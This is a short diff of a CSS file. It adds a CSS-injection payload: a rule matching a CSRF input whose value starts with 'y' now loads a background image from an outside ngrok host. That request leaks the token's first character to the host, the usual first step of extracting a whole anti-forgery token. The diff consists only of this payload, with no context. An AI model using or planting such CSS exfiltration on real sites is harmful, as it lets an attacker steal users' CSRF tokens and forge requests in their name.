@@ -1,4 +1,4 @@
 input[name="csrf"][value^="y"] {
   visibility: visible;
-  background-color: #ffffff);
+  background-image: url(https://48fc-134-214-58-60.ngrok-free.app/y);
 }
